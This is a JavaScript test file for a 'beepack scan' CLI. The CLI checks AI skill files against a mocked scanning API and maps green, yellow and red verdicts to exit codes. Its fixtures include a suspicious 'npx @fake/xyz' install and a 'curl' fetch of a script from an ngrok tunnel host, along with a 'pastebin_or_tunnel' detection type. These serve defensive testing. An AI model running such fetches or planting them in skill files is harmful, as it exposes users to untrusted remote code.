import test from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'child_process';
import { mkdtempSync, writeFileSync, rmSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import http from 'node:http';

/**
 * Spin up a tiny mock API server that mimics POST /api/v1/scan, then run the CLI
 * against it via BEEPACK_API. Verifies exit codes + JSON output.
 */
function startMockServer({ response, status = 200 }) {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      let body = '';
      req.on('data', c => (body += c));
      req.on('end', () => {
        try { res.end; } catch {}
        res.writeHead(status, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(response));
      });
    });
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({ server, url: `http://127.0.0.1:${port}/api/v1` });
    });
  });
}

function runCli(args, env) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, ['cli/bin/beepack.js', ...args], {
      env: { ...process.env, ...env, NO_COLOR: '1' },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', d => (stdout += d));
    child.stderr.on('data', d => (stderr += d));
    child.on('close', code => resolve({ code, stdout, stderr }));
  });
}

test('beepack scan exits 0 for GREEN verdict', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'bp-scan-'));
  const skillPath = join(tmp, 'SKILL.md');
  writeFileSync(skillPath, '# ok\n```bash\nnpm install react\n```');

  const { server, url } = await startMockServer({
    response: {
      scanId: 'test-green', scannedAt: new Date().toISOString(), source: 'SKILL.md',
      verdict: 'green', summary: 'All checks passed', findings: [],
      stats: { shellCommands: 1, urls: 0, npmPackages: 1, pipPackages: 0, imports: 0 },
    },
  });

  const { code, stdout } = await runCli(['scan', skillPath], { BEEPACK_API: url });
  server.close();
  rmSync(tmp, { recursive: true, force: true });
  assert.equal(code, 0);
  assert.ok(stdout.includes('GREEN'));
});

test('beepack scan exits 2 for RED verdict', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'bp-scan-'));
  const skillPath = join(tmp, 'SKILL.md');
  writeFileSync(skillPath, '# bad\n```bash\nnpx @fake/xyz\n```');

  const { server, url } = await startMockServer({
    response: {
      scanId: 'test-red', scannedAt: new Date().toISOString(), source: 'SKILL.md',
      verdict: 'red', summary: '1 critical', findings: [{ severity: 'block', type: 'package_does_not_exist', message: 'npm package missing' }],
      stats: { shellCommands: 1, urls: 0, npmPackages: 1, pipPackages: 0, imports: 0 },
    },
  });

  const { code, stdout } = await runCli(['scan', skillPath], { BEEPACK_API: url });
  server.close();
  rmSync(tmp, { recursive: true, force: true });
  assert.equal(code, 2);
  assert.ok(stdout.includes('RED'));
});

test('beepack scan exits 1 for YELLOW verdict by default', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'bp-scan-'));
  const skillPath = join(tmp, 'SKILL.md');
  writeFileSync(skillPath, '# ok\n```bash\ncurl https://abc.ngrok.io/script.sh\n```');

  const { server, url } = await startMockServer({
    response: {
      scanId: 'test-yellow', scannedAt: new Date().toISOString(), source: 'SKILL.md',
      verdict: 'yellow', summary: '1 warning', findings: [{ severity: 'warn', type: 'pastebin_or_tunnel', message: 'ngrok' }],
      stats: { shellCommands: 1, urls: 1, npmPackages: 0, pipPackages: 0, imports: 0 },
    },
  });

  const { code } = await runCli(['scan', skillPath], { BEEPACK_API: url });
  server.close();
  rmSync(tmp, { recursive: true, force: true });
  assert.equal(code, 1);
});

test('beepack scan --strict escalates YELLOW to exit 2', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'bp-scan-'));
  const skillPath = join(tmp, 'SKILL.md');
  writeFileSync(skillPath, '# ok\n```bash\ncurl https://abc.ngrok.io/x\n```');

  const { server, url } = await startMockServer({
    response: {
      scanId: 'test-strict', scannedAt: new Date().toISOString(), source: 'SKILL.md',
      verdict: 'yellow', summary: '1 warning', findings: [],
      stats: { shellCommands: 1, urls: 1, npmPackages: 0, pipPackages: 0, imports: 0 },
    },
  });

  const { code } = await runCli(['scan', '--strict', skillPath], { BEEPACK_API: url });
  server.close();
  rmSync(tmp, { recursive: true, force: true });
  assert.equal(code, 2);
});

test('beepack scan --json outputs JSON', async () => {
  const tmp = mkdtempSync(join(tmpdir(), 'bp-scan-'));
  const skillPath = join(tmp, 'SKILL.md');
  writeFileSync(skillPath, '# empty');

  const responseObj = {
    scanId: 'test-json', scannedAt: new Date().toISOString(), source: 'SKILL.md',
    verdict: 'green', summary: 'All checks passed', findings: [],
    stats: { shellCommands: 0, urls: 0, npmPackages: 0, pipPackages: 0, imports: 0 },
  };
  const { server, url } = await startMockServer({ response: responseObj });

  const { code, stdout } = await runCli(['scan', '--json', skillPath], { BEEPACK_API: url });
  server.close();
  rmSync(tmp, { recursive: true, force: true });
  assert.equal(code, 0);
  const parsed = JSON.parse(stdout);
  assert.equal(parsed.scanId, 'test-json');
  assert.equal(parsed.verdict, 'green');
});
